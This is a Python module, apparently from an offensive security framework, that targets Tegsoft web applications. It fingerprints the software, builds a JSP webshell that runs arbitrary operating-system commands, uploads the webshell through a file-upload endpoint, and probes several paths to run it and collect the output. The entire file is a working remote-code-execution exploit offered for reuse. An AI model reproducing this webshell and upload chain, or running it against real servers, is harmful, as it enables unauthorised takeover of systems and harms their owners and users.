#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""Tegsoft application HTTP helpers."""

from __future__ import annotations

import secrets
import time
from typing import List, Optional, Tuple

from core.framework.base_module import BaseModule

MARKER = "LLC4RGE"


class Tegsoft(BaseModule):
    """Tegsoft fingerprint, upload, and webshell probe."""

    @staticmethod
    def tegsoft_fingerprint(text: str) -> bool:
        blob = (text or "").lower()
        return "tegsoft" in blob or "tobe" in blob

    def tegsoft_detected(self) -> bool:
        for path in ("/", "/tobe/", "/index.jsp"):
            resp = self.http_request("GET", path, timeout=12)
            if resp and self.tegsoft_fingerprint(resp.text or ""):
                return True
        return False

    @staticmethod
    def tegsoft_jsp_shell(cmd: str, marker: str = MARKER) -> str:
        safe_cmd = (cmd or "id").replace('"', '\\"')
        return (
            '<%@ page import="java.util.*,java.io.*"%><%'
            f'String c="{safe_cmd}";'
            "Process p=Runtime.getRuntime().exec(c);"
            "BufferedReader b=new BufferedReader(new InputStreamReader(p.getInputStream()));"
            f'out.print("{marker}");String l;while((l=b.readLine())!=null){{out.println(l);}}'
            f'out.print("{marker}");%>'
        )

    def tegsoft_shell_paths(self, fname: str) -> List[str]:
        return [
            f"/upload/{fname}",
            f"/files/{fname}",
            f"/tobe/upload/{fname}",
            f"/{fname}",
        ]

    def tegsoft_probe_shell(self, fname: str) -> Tuple[Optional[str], Optional[str]]:
        for rel in self.tegsoft_shell_paths(fname):
            resp = self.http_request("GET", rel, timeout=15)
            if not resp:
                continue
            text = resp.text or ""
            if text.count(MARKER) >= 2:
                out = text.split(MARKER)[1].strip()
                return rel, out
        return None, None

    def tegsoft_upload_jsp(
        self,
        upload_path: str,
        cmd: str,
    ) -> Tuple[int, Optional[str], Optional[str]]:
        fname = f"llc_{int(time.time())}_{secrets.token_hex(3)}.jsp"
        body = self.tegsoft_jsp_shell(cmd).encode()
        files = {"file": (fname, body, "application/octet-stream")}
        resp = self.http_request(
            "POST",
            upload_path,
            files=files,
            timeout=40,
        )
        if not resp:
            return 0, None, None
        code = int(resp.status_code or 0)
        shell_path, out = self.tegsoft_probe_shell(fname)
        return code, shell_path, out